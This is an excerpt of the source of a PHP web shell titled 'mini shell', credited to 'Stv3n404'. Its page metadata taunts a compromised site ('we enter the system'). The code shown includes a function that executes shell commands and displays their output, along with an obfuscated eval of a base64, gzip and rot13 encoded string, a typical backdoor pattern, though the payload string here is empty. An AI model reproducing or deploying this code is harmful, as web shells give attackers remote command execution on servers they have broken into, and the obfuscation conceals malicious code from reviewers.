...
<head>
    ...
    <meta name="author" content="Stv3n404">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Your website is very weak, we enter the system !">
    <meta property="og:description" content="Your website is very weak, we enter the system !">
    <meta property="og:image" content="https://i.pinimg.com/736x/90/cd/dc/90cddce40041693bf9fa87fc8020e2ef.jpg">
...
<center>
<font face="Bungee" size="5">mini shell</font></center>
...
function author() {
    echo "<center><br>Stv3n404 - 2023</center>";
    exit();
}
...
function ekse($komend, $lokasi) {
    ...
    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>"; eval(gzuncompress(base64_decode(str_rot13(''))));
}
